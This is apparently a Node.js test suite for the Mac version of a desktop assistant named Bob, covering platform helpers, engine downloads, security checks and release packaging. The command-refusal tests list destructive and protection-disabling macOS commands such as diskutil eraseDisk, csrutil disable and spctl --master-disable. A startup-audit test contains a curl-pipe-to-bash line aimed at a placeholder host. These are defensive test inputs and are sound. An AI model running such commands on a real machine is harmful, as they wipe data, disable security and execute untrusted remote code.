// Bob on a Mac (and the shared Windows / Mac / Linux layer in src/platform.js). Runs on any computer: every Mac
// answer is asked for by name, with fake program output, so the Windows suite checks it too. Run: node test/run-mac-test.js
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { osKey, exeName, venvPython, defaultHome, killTree, supports, features, unifiedGraphicsGB, gpuInfo, machineWord } from '../src/platform.js';
import { ENGINES, engineFor, pickAsset, unpackCommand, makeRunnable } from '../src/engines.js';
import { handsHere, handHere, HANDS } from '../src/hands-settings.js';
import { parseLsof, sayMacNetwork, sayMacOverview, judgeMacStartup, sayMacStartup, readOverview, readStartup, macCheck, MAC_THREATS } from '../src/security-mac.js';
import { checkCommand } from '../src/hands-run.js';
import { sipsArgs } from '../src/office.js';
import { engineRunsOn, suit } from '../public/fit.js';
import { unixPythonGuesses } from '../src/audio.js';

let pass = 0, fail = 0;
const check = (name, ok, extra = '') => { ok ? pass++ : fail++; console.log(`${ok ? 'PASS' : 'FAIL'} ${name}${extra ? ' ' + extra : ''}`); };
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'bob-mac-'));

// ---------------------------------------------------------------- platform.js
check('osKey: Windows, Mac and Linux by their Node names', osKey('win32') === 'win' && osKey('darwin') === 'mac' && osKey('linux') === 'linux');
check('exeName: .exe only on Windows, and an old .exe name loses it elsewhere', exeName('llama-server', 'win') === 'llama-server.exe' && exeName('llama-server', 'mac') === 'llama-server' && exeName('piper.exe', 'mac') === 'piper');
check('venvPython: Scripts\\python.exe on Windows, bin/python elsewhere', venvPython('/v', 'win').endsWith(path.join('Scripts', 'python.exe')) && venvPython('/v', 'mac') === path.join('/v', 'bin', 'python'));
check('defaultHome on a Mac: ~/Library/Application Support/Bob/home', defaultHome({}, 'mac', '/Users/me') === path.join('/Users/me', 'Library', 'Application Support', 'Bob', 'home'));
check('defaultHome on Linux: XDG_DATA_HOME/bob, else ~/.local/share/bob', defaultHome({ XDG_DATA_HOME: '/x' }, 'linux', '/home/me') === path.join('/x', 'bob') && defaultHome({}, 'linux', '/home/me') === path.join('/home/me', '.local', 'share', 'bob'));
check('defaultHome on Windows: LOCALAPPDATA\\Bob', defaultHome({ LOCALAPPDATA: 'C:\\L' }, 'win', 'C:\\U') === path.join('C:\\L', 'Bob'));
{
  const killed = [];
  killTree({ pid: 42 }, { os_: 'mac', kill: (pid, sig) => killed.push([pid, sig]) });
  let ran = null;
  killTree({ pid: 43 }, { os_: 'win', spawnSyncImpl: (f, a) => { ran = [f, ...a]; } });
  check('killTree: the whole process group on a Mac, taskkill /T on Windows', killed[0]?.[0] === -42 && killed[0][1] === 'SIGKILL' && ran?.[0] === 'taskkill' && ran.includes('/T'));
}
check('features: Windows-only parts are off on a Mac', !supports('defender', 'mac') && !supports('appsHand', 'mac') && !supports('gamingCard', 'mac') && !supports('updateBob', 'mac') && supports('ownEngines', 'mac') && features('win').defender === true);
check('a Mac shares memory: about two thirds for graphics, three quarters from 36 GB', unifiedGraphicsGB(16 * 1024 ** 3) === 10 && unifiedGraphicsGB(64 * 1024 ** 3) === 48);
check('the words Bob uses: this Mac', machineWord('mac') === 'Mac' && machineWord('win') === 'PC');
{
  const fake = (out) => (f, a, o, cb) => cb(null, out);
  const g = await gpuInfo({ os_: 'mac', arch: 'arm64', totalmem: 32 * 1024 ** 3, execImpl: fake('Apple M2 Pro\n') });
  check('gpuInfo on Apple Silicon: the chip name and its share of shared memory', g?.name === 'Apple M2 Pro (shared memory)' && g.vramGB === 21 && g.unified === true, JSON.stringify(g));
  check('gpuInfo on an Intel Mac: none (Bob runs on the processor)', (await gpuInfo({ os_: 'mac', arch: 'x64', execImpl: fake('Intel') })) === null);
  const n = await gpuInfo({ os_: 'win', execImpl: fake('NVIDIA GeForce RTX 5070 Ti, 16303\n') });
  check('gpuInfo with an NVIDIA card: nvidia-smi as before', n?.name === 'NVIDIA GeForce RTX 5070 Ti' && n.vramGB === 16);
}

// ---------------------------------------------------------------- engines
const E = (id) => ENGINES.find((e) => e.id === id);
{
  const llama = engineFor(E('llamacpp'), 'mac');
  const assets = ['llama-b7000-bin-win-cuda-13.1-x64.zip', 'llama-b7000-bin-macos-arm64.zip', 'llama-b7000-bin-macos-x64.zip', 'llama-b7000-bin-ubuntu-x64.zip', 'llama-b7000-xcframework.zip'].map((name) => ({ name }));
  check('llama.cpp on a Mac: the Apple Silicon build (Metal built in), never CUDA', pickAsset(assets, llama, true)?.name === 'llama-b7000-bin-macos-arm64.zip');
  check('llama.cpp on a Mac: also the .tar.gz build', pickAsset([{ name: 'llama-b8000-bin-macos-arm64.tar.gz' }], llama, false)?.name === 'llama-b8000-bin-macos-arm64.tar.gz');
  check('llama.cpp on a Mac: the program is llama-server (no .exe)', llama.exe === 'llama-server');
  const sd = engineFor(E('sdcpp'), 'mac');
  check('stable-diffusion.cpp on a Mac: the Darwin arm64 build', pickAsset(['sd-master-abc1234-bin-win-cuda12-x64.zip', 'sd-master-abc1234-bin-Darwin-macOS-15.7.1-arm64.zip', 'sd-master-abc1234-bin-Linux-Ubuntu-24.04-x86_64.zip'].map((name) => ({ name })), sd, false)?.name === 'sd-master-abc1234-bin-Darwin-macOS-15.7.1-arm64.zip' && sd.exe === 'sd-cli' && sd.aka.includes('sd'));
  const uv = engineFor(E('audio'), 'mac');
  check('the audio tools on a Mac: uv for Apple Silicon', pickAsset(['uv-x86_64-pc-windows-msvc.zip', 'uv-aarch64-apple-darwin.tar.gz', 'uv-x86_64-apple-darwin.tar.gz'].map((name) => ({ name })), uv, false)?.name === 'uv-aarch64-apple-darwin.tar.gz' && uv.exe === 'uv');
  check('whisper.cpp and Piper on a Mac: not offered, with the reason', engineFor(E('whispercpp'), 'mac').unavailable && /Ollama|cloud/.test(engineFor(E('whispercpp'), 'mac').unavailable) && /Kokoro/.test(engineFor(E('piper'), 'mac').unavailable));
  check('FFmpeg and LibreOffice on a Mac: use the one installed', /Homebrew/.test(engineFor(E('ffmpeg'), 'mac').unavailable) && /libreoffice\.org/.test(engineFor(E('libreoffice'), 'mac').unavailable));
  check('a Windows pin (checksum) never applies to another computer\'s file', engineFor(E('piper'), 'mac').sha256 === '' && engineFor(E('piper'), 'win').sha256 === E('piper').sha256);
  check('Windows sees the engines exactly as before', engineFor(E('llamacpp'), 'win').exe === 'llama-server.exe' && engineFor(E('llamacpp'), 'win').nvidia === E('llamacpp').nvidia);
  check('unpacking: bsdtar on Windows and Mac, unzip for a zip on Linux', unpackCommand('a.zip', 'f', 'd', 'mac')[0] === 'tar' && unpackCommand('a.zip', 'f', 'd', 'linux')[0] === 'unzip' && unpackCommand('a.tar.gz', 'f', 'd', 'linux')[0] === 'tar');
  if (process.platform !== 'win32') {
    const d = path.join(tmp, 'eng');
    fs.mkdirSync(d);
    for (const f of ['llama-server', 'libggml-metal.dylib', 'README.md']) fs.writeFileSync(path.join(d, f), 'x', { mode: 0o644 });
    makeRunnable(d);
    const x = (f) => (fs.statSync(path.join(d, f)).mode & 0o111) !== 0;
    check('after unpacking: programs and libraries may run, other files stay as they are', x('llama-server') && x('libggml-metal.dylib') && !x('README.md'));
  }
}
check('model cards: Piper and whisper.cpp models are marked as not for a Mac yet', !engineRunsOn('Piper', 'darwin') && engineRunsOn('stable-diffusion.cpp', 'darwin') && /Mac/.test(suit({ needs: 'Piper', sizeGB: 0.1 }, {}, 'darwin').why));

// ---------------------------------------------------------------- Hands
check('Hands on a Mac: no Apps hand (it drives Windows apps)', !handsHere('mac').some((h) => h.id === 'apps') && handsHere('win').some((h) => h.id === 'apps') && !handHere('apps', 'mac'));
check('Hands on a Mac: the Security hand talks about the Mac, not Defender', /FileVault/.test(handsHere('mac').find((h) => h.id === 'security').what) && !/Defender/.test(handsHere('mac').find((h) => h.id === 'security').what));
check('defender_scan only exists on Windows', HANDS.security.toolsOnlyOn.defender_scan.join() === 'win');
{
  const cfg = { hands: { enabled: true, run: { on: true } } };
  const no = (cmd, args) => checkCommand(cfg, { cmd, args, cwd: tmp });
  check('Run hand: macOS disk, protection and account tools are refused', !no('diskutil', ['eraseDisk', 'APFS', 'X', 'disk2']).ok && !no('csrutil', ['disable']).ok && !no('sysadminctl', ['-deleteUser', 'x']).ok && !no('spctl', ['--master-disable']).ok);
  check('Run hand: and inside a shell line too', !no('bash', ['-c', 'diskutil eraseDisk APFS X disk2']).ok && !no('zsh', ['-c', "osascript -e 'do shell script \"x\" with administrator privileges'"]).ok && !no('bash', ['-c', 'xattr -d com.apple.quarantine app.zip']).ok);
}

// ---------------------------------------------------------------- Mac security checks (fake program output)
{
  const answers = {
    '--getglobalstate': 'Firewall is enabled. (State = 1)\n', '--getstealthmode': 'Firewall stealth mode is off\n', status: 'FileVault is Off.\n',
    '--status': 'assessments enabled\n'
  };
  const run = async (file, args) => (file.endsWith('csrutil') ? 'System Integrity Protection status: enabled.\n' : file.endsWith('defaults') ? '1\n' : answers[args[0]] || '');
  const o = await readOverview(run);
  check('overview reads the firewall, FileVault, Gatekeeper, SIP and updates', o.firewall === true && o.stealth === false && o.fileVault === false && o.gatekeeper === true && o.sip === true && o.autoUpdates === true, JSON.stringify(o));
  const said = sayMacOverview(o);
  check('overview in words: FileVault off is a warning with where to fix it', /⚠ FileVault is OFF[^\n]*System Settings > Privacy & Security > FileVault/.test(said) && /✓ The macOS firewall is on/.test(said));
  check('an answer that can\'t be read is said honestly, not as "off"', /couldn't read the firewall/.test(sayMacOverview({ firewall: null })));
  check('threats: says macOS keeps no history Bob can read', /XProtect/.test(await macCheck('threats')) && MAC_THREATS.includes('inspect_file'));
}
{
  const lsof = `COMMAND     PID USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME
Bob       101 me     20u  IPv4 0x1      0t0  TCP 127.0.0.1:7777 (LISTEN)
ollama    202 me      3u  IPv4 0x2      0t0  TCP 127.0.0.1:11434 (LISTEN)
ControlCe 303 me     10u  IPv4 0x3      0t0  TCP *:7000 (LISTEN)
sshd      404 root    5u  IPv6 0x4      0t0  TCP *:22 (LISTEN)`;
  const r = parseLsof(lsof);
  check('network: lsof lines are read (port, program, address)', r.listen.length === 4 && r.listen[0].port === 7777 && r.listen[2].addr === '0.0.0.0' && r.listen[3].proc === 'sshd');
  const said = sayMacNetwork(r);
  check('network in words: Bob and Ollama local only, Remote Login flagged', /2 only reachable from this Mac/.test(said) && /⚠ Remote sign-in[^\n]*22 sshd/.test(said) && /AirPlay/.test(said));
}
{
  check('startup: an agent from Downloads is a closer look', judgeMacStartup({ label: 'com.x.thing', program: '/Users/me/Downloads/thing', exists: true, command: '/Users/me/Downloads/thing' }).level === 2);
  check('startup: one that fetches and runs code from the internet is the worst mark', judgeMacStartup({ label: 'x', program: '/bin/bash', exists: true, command: '/bin/bash -c curl https://x.example/a.sh | bash' }).level === 3);
  check('startup: Apple\'s own is fine', judgeMacStartup({ label: 'com.apple.thing', program: '/usr/libexec/thing', exists: true, command: '/usr/libexec/thing' }).level === 0);
  const dir = path.join(tmp, 'LaunchAgents');
  fs.mkdirSync(dir);
  fs.writeFileSync(path.join(dir, 'com.example.helper.plist'), 'x');
  const run = async () => JSON.stringify({ Label: 'com.example.helper', ProgramArguments: ['/Applications/Helper.app/Contents/MacOS/helper', '--quiet'], RunAtLoad: true });
  const st = await readStartup(run, { dirs: [{ dir, where: 'starts when you log in (your user)' }] });
  check('startup: each .plist is read through plutil into label and command', st.items.length === 1 && st.items[0].label === 'com.example.helper' && st.items[0].command === '/Applications/Helper.app/Contents/MacOS/helper --quiet' && st.items[0].exists === false);
  check('startup in words: says where to switch them off, and that Bob only looks', /Login Items/.test(sayMacStartup(st)) && /Bob only looks/.test(sayMacStartup(st)));
}

// ---------------------------------------------------------------- converting pictures with sips, Python
check('pictures on a Mac: sips with format, quality and width', sipsArgs({ src: '/a.png', out: '/b.jpg', width: 640, quality: 80 }).join(' ') === '-s format jpeg -s formatOptions 80 --resampleWidth 640 /a.png --out /b.jpg');
check('Python on a Mac: python.org first, then Homebrew', unixPythonGuesses('mac')[0] === '/Library/Frameworks/Python.framework/Versions/3.12/bin/python3.12' && unixPythonGuesses('mac').includes('/opt/homebrew/bin/python3.11'));

// ---------------------------------------------------------------- the Mac app build
{
  const sh = fs.readFileSync(new URL('../installer/make-release-mac.sh', import.meta.url), 'utf8');
  check('Mac release: official Electron, checked against its SHASUMS256', /electron-v\$\{?ELECTRON/.test(sh) && /SHASUMS256/.test(sh) && /shasum -a 256/.test(sh));
  check('Mac release: renamed Bob.app with Bob\'s files in Contents/Resources/app, default_app.asar removed', /Bob\.app/.test(sh) && /Contents\/Resources\/app/.test(sh) && /default_app\.asar/.test(sh));
  check('Mac release: signed ad hoc (no Apple account) and zipped with ditto', /codesign --force --deep --sign -/.test(sh) && /ditto -c -k/.test(sh));
  const ps1 = fs.readFileSync(new URL('../installer/make-release.ps1', import.meta.url), 'utf8').match(/\$AppFiles = @\(([^)]*)\)/)[1].split(',').map((x) => x.trim().replace(/'/g, ''));
  const macList = (sh.match(/APP_FILES=\(([^)]*)\)/) || [])[1]?.trim().split(/\s+/) || [];
  check('Mac release: the same list of Bob\'s files as the Windows zip, never config.json', macList.join() === ps1.join() && !macList.includes('config.json'), macList.join());
  const wf = fs.readFileSync(new URL('../.github/workflows/build.yml', import.meta.url), 'utf8');
  check('the release workflow has a Mac job on Apple Silicon', /\n  mac:\r?\n[\s\S]*runs-on: macos-1\d/.test(wf) && /make-release-mac\.sh/.test(wf));
}

fs.rmSync(tmp, { recursive: true, force: true });
console.log(`\n${pass} passed, ${fail} failed`);
process.exit(fail ? 1 : 0);
